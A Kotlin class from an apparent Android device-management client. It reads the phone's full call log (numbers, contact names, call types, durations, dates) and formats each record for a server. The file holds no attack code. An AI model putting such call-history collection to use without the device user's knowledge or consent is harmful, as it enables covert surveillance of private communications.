package com.mdm.client.collectors

import android.content.Context
import android.provider.CallLog
import android.util.Log
import com.mdm.client.util.DateFormatter

class CallLogCollector(private val context: Context) {

    companion object {
        private const val TAG = "ClSync"
    }

    fun getCallLogs(): List<Map<String, Any>> {
        val logs = mutableListOf<Map<String, Any>>()
        return try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE
                ),
                null, null,
                "${CallLog.Calls.DATE} DESC"
            )
            cursor?.use {
                val numIdx  = it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                val nameIdx = it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
                val typeIdx = it.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                val durIdx  = it.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                val dateIdx = it.getColumnIndexOrThrow(CallLog.Calls.DATE)

                while (it.moveToNext()) {
                    val dateMs = it.getLong(dateIdx)
                    val type = when (it.getInt(typeIdx)) {
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE   -> "MISSED"
                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                        CallLog.Calls.BLOCKED_TYPE  -> "BLOCKED"
                        else -> "UNKNOWN"
                    }
                    logs.add(mapOf(
                        "number" to (it.getString(numIdx) ?: ""),
                        "name" to (it.getString(nameIdx) ?: ""),
                        "type" to type,
                        "duration" to it.getLong(durIdx),
                        // CRITICAL: format matches server's strptime "%a %b %d %H:%M:%S %Z%z %Y"
                        "date" to DateFormatter.format(dateMs)
                    ))
                }
            }
            logs
        } catch (e: Exception) {
            Log.e(TAG, "Failed to read call logs: ${e.message}")
            logs
        }
    }
}
